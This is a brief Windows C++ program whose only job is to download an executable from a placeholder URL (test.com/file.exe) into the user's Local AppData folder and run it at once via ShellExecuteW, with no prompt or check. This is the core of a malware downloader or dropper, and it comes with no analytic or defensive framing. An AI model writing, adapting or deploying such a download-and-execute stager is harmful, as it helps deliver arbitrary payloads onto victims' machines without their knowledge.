#include <iostream>
#include <string>
#include <windows.h>
#include <shlobj_core.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shlwapi.lib")

bool ggtry() {
    wchar_t szPath[MAX_PATH];
    LPCWSTR szURL = L"https://test.com/file.exe";

    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath);
    PathCombineW(szPath, szPath, L"downloaded_file.exe");
    HRESULT hr = URLDownloadToFile(NULL, szURL, szPath, 0, NULL);

    if(hr == S_OK) {
        ShellExecuteW(NULL, L"open", szPath, NULL, NULL, SW_SHOWNORMAL);
        return true;
    }

    return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ggtry();
    
    return 0;
}